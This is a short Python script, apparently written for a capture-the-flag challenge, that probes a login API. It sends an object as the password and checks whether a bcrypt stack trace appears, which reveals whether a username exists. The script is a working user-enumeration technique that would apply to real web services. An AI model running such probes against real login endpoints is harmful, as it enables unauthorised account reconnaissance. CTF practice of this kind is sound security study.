import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# Test if 'admin' exists -> Should get 500 Illegal arguments (or rather, the HTML stack trace containing bcrypt.compareSync)
r = requests.post(url, json={"username": "admin", "password": {"a": "b"}}, headers=headers)
print("admin:", "bcrypt" in r.text)

r = requests.post(url, json={"username": "nonexistent_1234", "password": {"a": "b"}}, headers=headers)
print("nonexistent:", "bcrypt" in r.text)
